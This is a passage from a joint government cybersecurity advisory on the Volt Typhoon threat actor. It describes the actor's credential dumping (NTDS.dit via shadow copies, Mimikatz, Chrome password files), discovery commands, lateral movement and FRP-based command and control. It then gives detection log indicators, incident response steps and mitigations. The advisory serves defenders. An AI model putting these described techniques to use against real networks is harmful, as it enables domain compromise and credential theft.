instance, where Volt Typhoon likely exploited CVE-2022-42475 in an unpatched Fortinet device, Volt 
Typhoon actors compromised a domain admin account stored inappropriately on the device. 
Volt Typhoon also consistently obtains valid credentials by extracting the Active Directory database 
file (NTDS.dit)—in some cases multiple times from the same victim over long periods [T1003.003]. 
NTDS.dit contains usernames, hashed passwords, and group memberships for all domain accounts, 
essentially allowing for full domain compromise if the hashes can be cracked offline. 
To obtain NTDS.dit, the U.S. authoring agencies have observed Volt Typhoon: 
1. Move laterally [TA0008] to the domain controller via an interactive RDP session using a 
compromised account with domain administrator privileges [T1021.001]; 
2. Execute the Windows-native vssadmin [T1006] command to create a volume shadow copy; 
3. Use Windows Management Instrumentation Console (WMIC) commands [T1047] to execute 
ntdsutil (a LOTL utility) to copy NTDS.dit and SYSTEM registry hive from the volume 
shadow copy; and  
4. Exfiltrate [TA0010] NTDS.dit and SYSTEM registry hive to crack passwords offline) 
[T1110.002]. (For more details, including specific commands used, see Appendix A: Volt 
Typhoon LOTL Activity.) 
Note: A volume shadow copy contains a copy of all the files and folders that exist on the 
specified volume. Each volume shadow copy created on a DC includes its NTDS.dit and the 
SYSTEM registry hive, which provides keys to decrypt the NTDS.dit file. 
Volt Typhoon actors have also been observed interacting with a PuTTY application by enumerating 
existing stored sessions [T1012]. Given this interaction and the exposure of cleartext-stored proxy 
passwords used in remote administration, Volt Typhoon actors potentially had access to PuTTY 
profiles that allow access to critical systems (see the Lateral Movement section). 
According to industry reporting, Volt Typhoon actors attempted to dump credentials through LSASS 
(see Appendix B for commands used).[2] 
The U.S. authoring agencies have observed Volt Typhoon actors leveraging Mimikatz to harvest 
credentials, and industry partners have observed Volt Typhoon leveraging Impacket.[2] 
• 
Mimikatz is a credential dumping tool and Volt Typhoon actors use it to obtain credentials. In 
one confirmed compromise, the Volt Typhoon used RDP to connect to a server and run 
Mimikatz after leveraging a compromised administrator account to deploy it. 
• 
Impacket is an open source Python toolkit for programmatically constructing and manipulating 
network protocols. It contains tools for Kerberos manipulation, Windows credential dumping, 
packet sniffing, and relay attacks—as well as remote service execution. 
Discovery 
Volt Typhoon actors have been observed using commercial tools, LOTL utilities, and appliances 
already present on the system for system information [T1082], network service [T1046], group 
[T1069] and user [T1033] discovery. 
 
 
 
TLP:CLEAR 
Page 12 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Volt Typhoon uses at least the following LOTL tools and commands for system information, network 
service, group, and user discovery techniques: 
• 
cmd 
• 
certutil 
• 
dnscmd 
• 
ldifde 
• 
makecab 
• 
net user/group/use 
• 
netsh 
• 
nltest 
• 
netstat 
• 
ntdsutil 
• 
ping 
• 
PowerShell 
• 
quser 
• 
reg query/reg save 
• 
systeminfo 
• 
tasklist 
• 
wevtutil 
• 
whoami 
• 
wmic 
• 
xcopy 
Some observed specific examples of discovery include: 
• 
Capturing successful logon events [T1654]. 
o Specifically, in one incident, analysis of the PowerShell console history of a domain 
controller indicated that security event logs were directed to a file named user.dat, as 
evidenced by the executed command Get-EventLog security -instanceid 4624 -
after [year-month-date] | fl * | Out-File 
'C:\users\public\documents\user.dat'. This indicates the group's specific interest in 
capturing successful logon events (event ID 4624) to analyze user authentication patterns 
within the network. Additionally, file system analysis, specifically of the Master File Table 
(MFT), uncovered evidence of a separate file, systeminfo.dat, which was created in 
C:\Users\Public\Documents but subsequently deleted [T1070.004]. The presence of 
these activities suggests a methodical approach by Volt Typhoon actors in collecting and 
then possibly removing traces of sensitive log information from the compromised system. 
• 
Executing tasklist /v to gather a detailed process listing [T1057], followed by executing 
taskkill /f /im rdpservice.exe (the function of this executable is not known). 
• 
Executing net user and quser for user account information [T1087.001]. 
• 
Creating and accessing a file named rult3uil.log on a domain controller in 
C:\Windows\System32\. The rult3uil.log file contained user activities on a compromised 
system, showcasing a combination of window title information [T1010] and focus shifts, 
keypresses, and command executions across Google Chrome and Windows PowerShell, with 
corresponding timestamps. 
• 
Employing ping with various IP addresses to check network connectivity [T1016.001] and net 
start to list running services [T1007]. 
See Appendix A for additional LOTL examples. 
In one confirmed compromise, Volt Typhoon actors attempted to use Advanced IP Scanner, which 
was on the network for admin use, to scan the network. 
Volt Typhoon actors have been observed strategically targeting network administrator web browser 
data—focusing on both browsing history and stored credentials [T1555.003]—to facilitate targeting of 
personal email addresses (see the Reconnaissance section) for further discovery and possible 
network modifications that may impact the threat actor’s persistence within victim networks. 
 
 
 
TLP:CLEAR 
Page 13 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
In one confirmed compromise: 
• 
Volt Typhoon actors obtained the history file from the User Data directory of a network 
administrator user’s Chrome browser. To obtain the history file, Volt Typhoon actors first 
executed an RDP session to the user’s workstation where they initially attempted, and failed, 
to obtain the C$ File Name: 
users\{redacted}\appdata\local\Google\Chrome\UserData\default\History file, as 
evidenced by the accompanying 1016 (reopen failed) SMB error listed in the application event 
log. The threat actors then disconnected the RDP session to the workstation and accessed 
the file C:\Users\{redacted}\Downloads\History.zip. This file presumably contained 
data from the User Data directory of the user’s Chrome browser, which the actors likely 
saved in the Downloads directory for exfiltration [T1074]. Shortly after accessing the 
history.zip file, the actors terminated RDP sessions. 
• 
About four months later, Volt Typhoon actors accessed the same user’s Chrome data C$ 
File Name: Users\{redacted}\AppData\Local\Google\Chrome\User Data\Local 
State and $ File Name: Users\{redacted}\AppData\Local\Google\Chrome\User 
Data\Default\Login Data via SMB. The Local State file contains the Advanced Encryption 
Standard (AES) encryption key [T1552.004] used to encrypt the passwords stored in the 
Chrome browser, which would enable the actors to obtain plaintext passwords stored in the 
Login Data file in the Chrome browser. 
In another confirmed compromise, Volt Typhoon actors accessed directories containing Chrome and 
Edge user data on multiple systems. Directory interaction was observed over the network to paths 
such as C:\Users\{redacted}\AppData\Local\Google\Chrome\User Data\ and 
C:\Users\{redacted}\AppData\Local\Microsoft\Edge\User Data\. They also enumerated 
several directories, including directories containing vulnerability testing and cyber related content and 
facilities data, such as construction drawings [T1083]. 
Lateral Movement 
For lateral movement, Volt Typhoon actors have been observed predominantly employing RDP with 
compromised valid administrator credentials. Note: With a full on-premises Microsoft Active Directory 
identity compromise (see the Credential Access section), the group may be capable of using other 
methods such as Pass the Hash or Pass the Ticket for lateral movement [T1550]. 
In one confirmed compromise of a Water and Wastewater Systems Sector entity, after obtaining initial 
access, Volt Typhoon actors connected to the network via a VPN with administrator credentials they 
obtained and opened an RDP session with the same credentials to move laterally. Over a nine-month 
period, they moved laterally to a file server, a domain controller, an Oracle Management Server 
(OMS), and a VMware vCenter server. The actors obtained domain credentials from the domain 
controller and performed discovery, collection, and exfiltration on the file server (see the Discovery 
and Collection and Exfiltration sections). 
Volt Typhoon’s movement to the vCenter server was likely strategic for pre-positioning to OT assets. 
The vCenter server was adjacent to OT assets, and Volt Typhoon actors were observed interacting 
with the PuTTY application on the server by enumerating existing stored sessions. With this 
 
 
 
TLP:CLEAR 
Page 14 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
information, Volt Typhoon potentially had access to a range of critical PuTTY profiles, including those 
for water treatment plants, water wells, an electrical substation, OT systems, and network security 
devices. This would enable them to access these critical systems [T1563]. See Figure 2. 
 
 
Figure 2: Volt Typhoon Lateral Movement Path File Server, DC, and OT-Adjacent Assets 
Additionally, Volt Typhoon actors have been observed using PSExec to execute remote processes, 
including the automated acceptance of the end-user license agreement (EULA) through an 
administrative account, signified by the accepteula command flag. 
Volt Typhoon actors may have attempted to move laterally to a cloud environment in one victim’s 
network but direct attribution to the Volt Typhoon group was inconclusive. During the period of the 
their known network presence, there were anomalous login attempts to an Azure tenant [T1021.007] 
potentially using credentials [T1078.004] previously compromised from theft of NTDS.dit. These 
attempts, coupled with misconfigured virtual machines with open RDP ports, suggested a potential for 
cloud-based lateral movement. However, subsequent investigations, including password changes and 
multifactor authentication (MFA) implementations, revealed authentication failures from non-
associated IP addresses, with no definitive link to Volt Typhoon. 
Collection and Exfiltration 
The U.S. authoring agencies assess Volt Typhoon primarily collects information that would facilitate 
follow-on actions with physical impacts. For example, in one confirmed compromise, they collected 
[TA0009] sensitive information obtained from a file server in multiple zipped files [T1560] and likely 
exfiltrated [TA0010] the files via Server Message Block (SMB) [T1048] (see Figure 3). Collected 
information included diagrams and documentation related to OT equipment, including supervisory 
 
 
 
TLP:CLEAR 
Page 15 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
control and data acquisition (SCADA) systems, relays, and switchgear. This data is crucial for 
understanding and potentially impacting critical infrastructure systems, indicating a focus on gathering 
intelligence that could be leveraged in actions targeting physical assets and systems. 
 
Figure 3: Volt Typhoon Attack Path for Exfiltration of Data from File Server 
In another compromise, Volt Typhoon actors leveraged WMIC to create and use temporary 
directories (C:\Users\Public\pro, C:\Windows\Temp\tmp, C:\Windows\Temp\tmp\Active 
Directory and C:\Windows\Temp\tmp\registry) to stage the extracted ntds.dit and SYSTEM 
registry hives from ntdsutil execution volume shadow copies (see the Credential Access section) 
obtained from two DCs. They then compressed and archived the extracted ntds.dit and 
accompanying registry files by executing ronf.exe, which was likely a renamed version of the 
archive utility rar.exe) [T1560.001]. 
Command and Control 
Volt Typhoon actors have been observed leveraging compromised SOHO routers and virtual private 
servers (VPS) to proxy C2 traffic. For more information, see DOJ press release U.S. Government 
Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure). 
They have also been observed setting up FRP clients [T1090] on a victim’s corporate infrastructure to 
establish covert communications channels [T1573] for command and control. In one instance, Volt 
Typhoon actors implanted the FRP client with filename SMSvcService.exe on a Shortel Enterprise 
Contact Center (ECC) server and a second FRP client with filename Brightmetricagent.exe on 
another server. These clients, when executed via PowerShell [T1059.001], open reverse proxies 
between the compromised system and Volt Typhoon C2 servers. Brightmetricagent.exe has 
 
 
 
TLP:CLEAR 
Page 16 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
additional capabilities. The FRP client can locate servers behind a network firewall or obscured 
through Network Address Translation (NAT) [T1016]. It also contains multiplexer libraries that can bi-
directionally stream data over NAT networks and contains a command-line interface (CLI) library that 
can leverage command shells such as PowerShell, Windows Management Instrumentation (WMI), 
and Z Shell (zsh) [T1059.004]. See Appendix C and MAR-10448362-1.v1 for more information. 
In the same compromise, Volt Typhoon actors exploited a Paessler Router Traffic Grapher (PRTG) 
server as an intermediary for their FRP operations. To facilitate this, they used the netsh command, 
a legitimate Windows command, to create a PortProxy registry modification [T1112] on the PRTG 
server [T1090.001]. This key alteration redirected specific port traffic to Volt Typhoon’s proxy 
infrastructure, effectively converting the PRTG’s server into a proxy for their C2 traffic [T1584.004] 
(see Appendix B for details). 
DETECTION/HUNT RECOMMENDATIONS 
Apply Living off the Land Detection Best Practices 
Apply the prioritized detection and hardening best practice recommendations provided in joint 
guide Identifying and Mitigating Living off the Land Techniques. Many organizations lack 
security and network management best practices (such as established baselines) that support 
detection of malicious LOTL activity—this makes it difficult for network defenders to discern legitimate 
behavior from malicious behavior and conduct behavior analytics, anomaly detection, and proactive 
hunting. Conventional IOCs associated with the malicious activity are generally lacking, complicating 
network defenders’ efforts to identify, track, and categorize this sort of malicious behavior. This 
advisory provides guidance for a multifaceted cybersecurity strategy that enables behavior analytics, 
anomaly detection, and proactive hunting, which are part of a comprehensive approach to mitigating 
cyber threats that employ LOTL techniques. 
Review Application, Security, and System Event Logs 
Routinely review application, security, and system event logs, focusing on Windows 
Extensible Storage Engine Technology (ESENT) Application Logs. Due to Volt Typhoon’s ability 
for long-term undetected persistence, network defenders should assume significant dwell time and 
review specific application event log IDs, which remain on endpoints for longer periods compared to 
security event logs and other ephemeral artifacts. Focus on Windows ESENT logs because certain 
ESENT Application Log event IDs (216, 325, 326, and 327) may indicate actors copying NTDS.dit. 
See Table 1 for examples of ESENT and other key log indicators that should be investigated. Please 
note that incidents may not always have exact matches listed in the Event Detail column due to 
variations in event logging and TTPs. 
 
 
 
TLP:CLEAR 
Page 17 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Table 1: Key Log Indicators for Detecting Volt Typhoon Activity 
Event ID 
(Log) 
Event Detail 
Description 
216 
(Windows 
ESENT 
Application 
Log) 
A database location change was detected from 
'C:\Windows\NTDS\ntds.dit' to 
'\\?\GLOBALROOT\Device\{redacted}VolumeShadowC
opy1\Windows\NTDS\ntds.dit' 
A change in the NTDS.dit 
database location is 
detected. This could 
suggest an initial step in 
NTDS credential dumping 
where the database is 
being prepared for 
extraction. 
325 
(Windows 
ESENT 
Application 
Log) 
The database engine created a new database (2, 
C:\Windows\Temp\tmp\Active Directory\ntds.dit). 
Indicates creation of a new 
NTDS.dit file in a non-
standard directory. Often a 
sign of data staging for 
exfiltration. Monitor for 
unusual database 
operations in temp 
directories. 
637 
(Windows 
ESENT 
Application 
Log) 
C:\Windows\Temp\tmp\Active Directory\ntds.jfm-++- (0) 
New flush map file “C:\Windows\Temp\tmp\Active 
Directory\ntds.jfm” will be created to enable persisted 
lost flush detection. 
A new flush map file is 
being created for 
NTDS.dit. This may 
suggest ongoing operations 
related to NTDS credential 
dumping, potentially 
capturing uncommitted 
changes to the NTDS.dit 
file. 
326 
(Windows 
ESENT 
Application 
Log) 
NTDS-++-12460,D,100-++--++-1-++- 
C:\$SNAP_{redacted}_VOLUMEC$\Windows\NTDS\nt
ds.dit-++-0-++- [1] The database engine attached a 
database. Began mounting of 
C:\Windows\NTDS\ntds.dit file created from volume 
shadow copy process 
Represents the mounting of 
an NTDS.dit file from a 
volume shadow copy. This 
is a critical step in NTDS 
credential dumping, 
indicating active 
manipulation of a domain 
controller’s data. 
 
 
 
TLP:CLEAR 
Page 18 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Event ID 
(Log) 
Event Detail 
Description 
327 
(Windows 
ESENT 
Application 
Log) 
C:\Windows\Temp\tmp\Active Directory\ntds.dit-++-1-
++- [1] The database engine detached a database (2, 
C:\Windows\Temp\tmp\Active Directory\ntds.dit). 
Completion of mounting of ntds.dit file to 
C:\Windows\Temp\tmp\Active Director 
The detachment of a 
database, particularly in a 
temp directory, could 
indicate the completion of a 
credential dumping 
process, potentially as part 
of exfiltration preparations. 
21 (Windows 
Terminal 
Services 
Local 
Session 
Manager 
Operational 
Log) 
Remote Desktop Services: Session logon succeeded: 
User: {redacted}\{redacted} Session ID: {redacted} 
Source Network Address: {redacted} 
Successful authentication 
to a Remote Desktop 
Services session. 
22 (Windows 
Terminal 
Services 
Local 
Session 
Manager 
Operational 
Log) 
Remote Desktop Services: Shell start notification 
received: User: {redacted}\{redacted} Session ID: 
{redacted} Source Network Address: {redacted} 
Successful start of a new 
Remote Desktop session. 
This may imply lateral 
movement or unauthorized 
remote access, especially if 
the user or session is 
unexpected. 
23 (Windows 
Terminal 
Services 
Local 
Session 
Manager 
Operational 
Log) 
Remote Desktop Services: Session logoff succeeded: 
User: {redacted}\{redacted} Session ID: {redacted} 
Successful logoff of 
Remote Desktop session. 
24 (Windows 
Terminal 
Services 
Local 
Remote Desktop Services: Session has been 
disconnected: User: {redacted}\{redacted} Session ID: 
{redacted} Source Network Address: {redacted} 
Remote Desktop session 
disconnected by user or 
due to network connectivity 
issues. 
 
 
 
TLP:CLEAR 
Page 19 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
Event ID 
(Log) 
Event Detail 
Description 
Session 
Manager 
Operational 
Log) 
25 (Windows  
Terminal 
Services 
Local 
Session 
Manager 
Operational 
Log) 
Remote Desktop Services: Session reconnection 
succeeded: User: {redacted}\{redacted} Session ID: 
{redacted} Source Network Address: {redacted} 
Successful reconnection to 
a Remote Desktop 
Services session. This may 
imply lateral movement or 
unauthorized remote 
access, especially if the 
user or session is 
unexpected. 
1017 
(Windows 
System Log) 
Handle scavenged. 
Share Name: C$ 
File Name: 
users\{redacted}\downloads\History.zip Durable: 1 
Resilient or Persistent: 0 Guidance: The server closed 
a handle that was previously reserved for a client after 
60 seconds.  
Indicates the server closed 
a handle for a client. While 
common in network 
operations, unusual 
patterns or locations (like 
History.zip in a user’s 
downloads) may suggest 
data collection from a local 
system. 
1102 
(Windows 
Security 
Log) 
All 
All Event ID 1102 entries 
should be investigated as 
logs are generally not 
cleared and this is a known 
Volt Typhoon tactic to cover 
their tracks. 
Monitor and Review OT System Logs 
• 
Review access logs for communication paths between IT and OT networks, looking for 
anomalous accesses or protocols. 
• 
Measure the baseline of normal operations and network traffic for the industrial control system 
(ICS) and assess traffic anomalies for malicious activity. 
• 
Configure intrusion detection systems (IDS) to create alarms for any ICS network traffic 
outside normal operations. 
• 
Track and monitor audit trails on critical areas of ICS. 
 
 
 
TLP:CLEAR 
Page 20 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
• 
Set up security incident and event monitoring (SIEM) to monitor, analyze, and correlate event 
logs from across the ICS network to identify intrusion attempts. 
Review CISA’s Recommended Cybersecurity Practices for Industrial Control Systems and the joint 
advisory, NSA and CISA Recommend Immediate Actions to Reduce Exposure Across all Operational 
Technologies and Control Systems, for further OT system detection and mitigation guidance. 
Use gait to Detect Possible Network Proxy Activities 
Use gait[4] to detect network proxy activities. Developed by Sandia National Labs, gait is a 
publicly available Zeek[5] extension. The gait extension can help enrich Zeek’s network connection 
monitoring and SSL logs by including additional metadata in the logs. Specifically, gait captures 
unique TCP options and timing data such as a TCP, transport layer security (TLS), and Secure Shell 
(SSH) layer inferred round trip times (RTT), aiding in the identification of the software used by both 
endpoints and intermediaries. 
While the gait extension for Zeek is an effective tool for enriching network monitoring logs with 
detailed metadata, it is not specifically designed to detect Volt Typhoon actor activities. The 
extension’s capabilities extend to general anomaly detection in network traffic, including—but not 
limited to—proxying activities. Therefore, while gait can be helpful in identifying tactics similar to those 
used by Volt Typhoon, such as proxy networks and FRP clients for C2 communication, not all 
proxying activities detected by using this additional metadata are necessarily indicative of Volt 
Typhoon presence. It serves as a valuable augmentation to current security stacks for a broader 
spectrum of threat detection. 
For more information, see Sandia National Lab’s gait GitHub page sandialabs/gait: Zeek Extension to 
Collect Metadata for Profiling of Endpoints and Proxies. 
Review Logins for Impossible Travel 
Examine VPN or other account logon times, frequency, duration, and locations. Logons from 
two geographically distant locations within a short timeframe from a single user may indicate an 
account is being used maliciously. Logons of unusual frequency or duration may indicate a threat 
actor attempting to access a system repeatedly or maintain prolonged sessions for the purpose of 
data extraction. 
Review Standard Directories for Unusual Files 
Review directories, such as C:\windows\temp\ and C:\users\public\, for unexpected or 
unusual files. Monitor these temporary file storage directories for files typically located in standard 
system paths, such as the System32 directory. For example, Volt Typhoon has been observed 
downloading comsvcs.dll to a non-standard folder (this file is normally found in the System32 
folder). 
INCIDENT RESPONSE 
If compromise, or potential compromise, is detected, organizations should assume full domain 
compromise because of Volt Typhoon’s known behavioral pattern of extracting the NTDS.dit from 
 
 
 
TLP:CLEAR 
Page 21 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
the DCs. Organizations should immediately implement the following immediate, defensive 
countermeasures: 
1. Sever the enterprise network from the internet. Note: this step requires the agency to 
understand its internal and external connections. When making the decision to sever internet 
access, knowledge of connections must be combined with care to avoid disrupting critical 
functions. 
a. If you cannot sever from the internet, shutdown all non-essential traffic between the 
affected enterprise network and the internet. 
2. Reset credentials of privileged and non-privileged accounts within the trust boundary 
of each compromised account. 
a. Reset passwords for all domain users and all local accounts, such as Guest, 
HelpAssistant, DefaultAccount, System, Administrator, and krbtgt. The krbtgt 
account is responsible for handling Kerberos ticket requests as well as encrypting and 
signing them. The krbtgt account should be reset twice because the account has a two-
password history. The first account reset for the krbtgt needs to be allowed to replicate 
prior to the second reset to avoid any issues. See CISA’s Eviction Guidance for Networks 
Affected by the SolarWinds and Active Directory/M365 Compromise for more information. 
Although tailored to FCEB agencies compromised in the 2020 SolarWinds Orion supply 
chain compromise, the steps are applicable to organizations with Windows AD 
compromise. 
i) Review access policies to temporarily revoke privileges/access for affected 
accounts/devices. If it is necessary to not alert the attacker (e.g., for intelligence 
purposes), then privileges can be reduced for affected accounts/devices to “contain” 
them. 
b. Reset the relevant account credentials or access keys if the investigation finds the threat 
actor’s access is limited to non-elevated permissions. 
i) Monitor related accounts, especially administrative accounts, for any further signs of 
unauthorized access. 
3. Audit all network appliance and edge device configurations with indicators of malicious activity 
for signs of unauthorized or malicious configuration changes. Organizations should ensure 
they audit the current network device running configuration and any local configurations that 
could be loaded at boot time. If configuration changes are identified: 
a. Change all credentials being used to manage network devices, to include keys and strings 
used to secure network device functions (SNMP strings/user credentials, IPsec/IKE 
preshared keys, routing secrets, TACACS/RADIUS secrets, RSA keys/certificates, etc.). 
b. Update all firmware and software to the latest version. 
4. Report the compromise to an authoring agency (see the Contact Information section). 
5. For organizations with cloud or hybrid environments, apply best practices for identity and 
credential access management. 
a. Verify that all accounts with privileged role assignments are cloud native, not synced from 
Active Directory. 
 
 
 
TLP:CLEAR 
Page 22 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
b. Audit conditional access policies to ensure Global Administrators and other highly 
privileged service principals and accounts are not exempted. 
c. Audit privileged role assignments to ensure adherence to the principle of least privilege 
when assigning privileged roles. 
d. Leverage just-in-time and just-enough access mechanisms when administrators need to 
elevate to a privileged role. 
e. In hybrid environments, ensure federated systems (such as AD FS) are configured and 
monitored properly. 
f. Audit Enterprise Applications for recently added applications and examine the API 
permissions assigned to each. 
6. Reconnect to the internet. Note: The decision to reconnect to the internet depends on 
senior leadership’s confidence in the actions taken. It is possible—depending on the 
environment—that new information discovered during pre-eviction and eviction steps could 
add additional eviction tasks. 
7. Minimize and control use of remote access tools and protocols by applying best practices 
from joint Guide to Securing Remote Access Software and joint Cybersecurity Information 
Sheet: Keeping PowerShell: Security Measures to Use and Embrace. 
8. Consider sharing technical information with an authoring agency and/or a sector-
specific information sharing and analysis center. 
For more information on incident response and remediation, see: 
• 
Joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity. This 
advisory provides incident response best practices. 
• 
CISA’s Federal Government Cybersecurity Incident and Vulnerability Response Playbooks. 
Although tailored to U.S. Federal Civilian Executive Branch (FCEB) agencies, the playbooks 
are applicable to all organizations. The incident response playbook provides procedures to 
identify, coordinate, remediate, recover, and track successful mitigations from incidents. 
• 
Joint Water and Wastewater Sector - Incident Response Guide. This joint guide provides 
incident response best practices and information on federal resources for Water and 
Wastewater Systems Sector organizations. 
 
 
 
 
 
TLP:CLEAR 
Page 23 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
MITIGATIONS 
The authoring agencies recommend 
organizations implement the mitigations below 
to improve your organization’s cybersecurity 
posture on the basis of Volt Typhoon activity. 
These mitigations align with the Cross-Sector 
Cybersecurity Performance Goals (CPGs) 
developed by CISA and the National Institute of 
Standards and Technology (NIST). The CPGs 
provide a minimum set of practices and 
protections that CISA and NIST recommend all 
organizations implement. CISA and NIST based 
the CPGs on existing cybersecurity frameworks 
and guidance to protect against the most 
common and impactful threats, tactics, 
techniques, and procedures. Visit CISA’s 
Cross-Sector Cybersecurity Performance Goals 
for more information on the CPGs, including 
additional recommended baseline protections. 
IT Network Administrators and Defenders 
Harden the Attack Surface 
• 
Apply patches for internet-facing systems within a risk-informed span of time [CPG 1E]. 
Prioritize patching critical assets, known exploited vulnerabilities, and vulnerabilities in 
appliances known to be frequently exploited by Volt Typhoon (e.g., Fortinet, Ivanti, NETGEAR, 
Citrix, and Cisco devices). 
• 
Apply vendor-provided or industry standard hardening guidance to strengthen software 
and system configurations. Note: As part of CISA’s Secure by Design campaign, CISA urges 
software manufacturers to prioritize secure by default configurations to eliminate the need for 
customer implementation of hardening guidelines.  
• 
Maintain and regularly update an inventory of all organizational IT assets [CPG 1A]. 
• 
Use third party assessments to validate current system and network security 
compliance via security architecture reviews, penetration tests, bug bounties, attack surface 
management services, incident simulations, or table-top exercises (both announced and 
unannounced) [CPG 1F]. 
• 
Limit internet exposure of systems when not necessary. An organization’s primary attack 
surface is the combination of the exposure of all its internet-facing systems. Decrease the 
attack surface by not exposing systems or management interfaces to the internet when not 
necessary. 
• 
Plan “end of life” for technology beyond manufacturer supported lifecycle. Inventories 
of organizational assets should be leveraged in patch and configuration management as noted 
These mitigations are intended for IT 
administrators in critical infrastructure 
organizations. The authoring agencies recommend 
that software manufactures incorporate secure by 
design and default principles and tactics into their 
software development practices to strengthen the 
security posture for their customers. 
For information on secure by design practices that 
may protect customers against common Volt 
Typhoon techniques, see joint guide Identifying 
and Mitigating Living off the Land Techniques and 
joint Secure by Design Alert Security Design 
Improvements for SOHO Device Manufacturers. 
For more information on secure by design, see 
CISA’s Secure by Design webpage and joint 
guide. 
 
 
 
TLP:CLEAR 
Page 24 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
above. Inventories will also enable identification of technology beyond the manufacturer’s 
supported lifecycle. Where technology is beyond “end of life” or “end of support,” additional 
cybersecurity vigilance is necessary, and may warrant one or more of the following: 
o Supplemental support agreements; 
o Additional scanning and testing; 
o Configuration changes; 
o Isolation; 
o Segmentation; and 
o Development of forward-looking plans to facilitate replacement. 
Secure Credentials 
• 
Do not store credentials on edge appliances/devices. Ensure edge devices do not contain 
accounts that could provide domain admin access. 
• 
Do not store plaintext credentials on any system [CPG 2L]. Credentials should be stored 
securely—such as with a credential/password manager or vault, or other privileged account 
management solutions—so they can only be accessed by authenticated and authorized users. 
• 
Change default passwords [CPG 2A] and ensure they meet the policy requirements for 
complexity. 
• 
Implement and enforce an organizational system-enforced policy that: 
o Requires passwords for all IT password-protected assets to be at least 15 
characters; 
o Does not allow users to reuse passwords for accounts, applications, services, etc., 
[CPG 2C]; and 
o Does not allow service accounts/machine accounts to reuse passwords from 
member user accounts. 
• 
Configure Group Policy settings to prevent web browsers from saving passwords and 
disable autofill functions. 
• 
Disable the storage of clear text passwords in LSASS memory. 
Secure Accounts 
• 
Implement phishing-resistant MFA for access to assets [CPG 2H]. 
• 
Separate user and privileged accounts. 
o User accounts should never have administrator or super-user privileges [CPG 2E]. 
o Administrators should never use administrator accounts for actions and activities not 
associated with the administrator role (e.g., checking email, web browsing). 
• 
Enforce the principle of least privilege. 
o Ensure administrator accounts only have the minimum permissions necessary to 
complete their tasks. 
o Review account permissions for default/accounts for edge appliances/devices and 
remove domain administrator privileges, if identified. 
 
 
 
TLP:CLEAR 
Page 25 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
o Significantly limit the number of users with elevated privileges. Implement continuous 
monitoring for changes in group membership, especially in privileged groups, to detect and 
respond to unauthorized modifications. 
o Remove accounts from high-privilege groups like Enterprise Admins and Schema 
Admins. Temporarily reinstate these privileges only when necessary and under strict 
auditing to reduce the risk of privilege abuse. 
o Transition to Group Managed Service Accounts (gMSAs) where suitable for enhanced 
management and security of service account credentials. gMSAs provide automated 
password management and simplified Service Principal Name (SPN) management, 
enhancing security over traditional service accounts. See Microsoft’s Group Managed 
Service Accounts Overview. 
• 
Enforce strict policies via Group Policy and User Rights Assignments to limit high-
privilege service accounts. 
• 
Consider using a privileged access management (PAM) solution to manage access to 
privileged accounts and resources [CPG 2L]. PAM solutions can also log and alert usage to 
detect any unusual activity. 
• 
Complement the PAM solution with role-based access control (RBAC) for tailored access 
based on job requirements. This ensures that elevated access is granted only when required 
and for a limited duration, minimizing the window of opportunity for abuse or exploitation of 
privileged credentials. 
• 
Implement an Active Directory tiering model to segregate administrative accounts 
based on their access level and associated risk. This approach reduces the potential impact of 
a compromised account. See Microsoft’s PAM environment tier model. 
• 
Harden administrative workstations to only permit administrative activities from 
workstations appropriately hardened based on the administrative tier. See Microsoft’s Why are 
privileged access devices important - Privileged access. 
• 
Disable all user accounts and access to organizational resources of employees on the 
day of their departure [CPG 2G] 
• 
Regularly audit all user, admin, and service accounts and remove or disable unused or 
unneeded accounts as applicable. 
• 
Regularly roll NTLM hashes of accounts that support token-based authentication. 
• 
Improve management of hybrid (cloud and on-premises) identity federation by: 
o Using cloud only administrators that are asynchronous with on-premises 
environments and ensuring on-premises administrators are asynchronous to the cloud. 
o Using CISA’s SCuBAGear tool to discover cloud misconfigurations in Microsoft 
cloud tenants. SCuBA gear is automation script for comparing Federal Civilian Executive 
Branch (FCEB) agency tenant configurations against CISA M365 baseline 
recommendations. SCuBAGear is part of CISA’s Secure Cloud Business Applications 
(SCuBA) project, which provides guidance for FCEB agencies, securing their cloud 
business application environments and protecting federal information created, accessed, 
shared, and stored in those environments. Although tailored to FCEB agencies, the project 
provides security guidance applicable to all organizations with cloud environments. For 
 
 
 
TLP:CLEAR 
Page 26 of 45  |  Product ID: AA24-038A 
TLP:CLEAR 
more information on SCuBAGear see CISA’s Secure Cloud Business Applications 
(SCuBA) Project. 
o Using endpoint detection and response capabilities to actively defend on-premises 
federation servers. 
Secure Remote Access Services 
• 
Limit the use of RDP and other remote desktop services. If RDP is necessary, apply best 
practices, including auditing the network for systems using RDP, closing unused RDP ports, 
and logging RDP login attempts. 
• 
Disable Server Message Block (SMB) protocol version 1 and upgrade to version 3 
(SMBv3) after mitigating existing dependencies (on existing systems or applications), as they 
may break when disabled. 
• 
Harden SMBv3 by implementing guidance included in joint #StopRansomware Guide (see 
page 8 of the guide). 
• 
Apply mitigations from the joint Guide to Securing Remote Access Software. 
Secure Sensitive Data 
• 
Securely store sensitive data (including operational technology documentation, network 
diagrams, etc.), ensuring that only authenticated and authorized users can access the data. 
Implement Network Segmentation 
• 
Ensure that sensitive accounts use their administrator credentials only on hardened, 
secure computers. This practice can reduce lateral movement exposure within networks. 
• 
Conduct comprehensive trust assessments to identify business-critical trusts and 
apply necessary controls to prevent unauthorized cross-forest/domain traversal. 
• 
Harden federated authentication by enabling Secure Identifier (SID) Filtering and 
Selective Authentication on AD trust relationships to further restrict unauthorized access 
across domain boundaries. 
• 
Implement network segmentation to isolate federation servers from other systems and 
limit allowed traffic to systems and protocols that require access in accordance with Zero Trust 
principles. 
Secure Cloud Assets 
• 
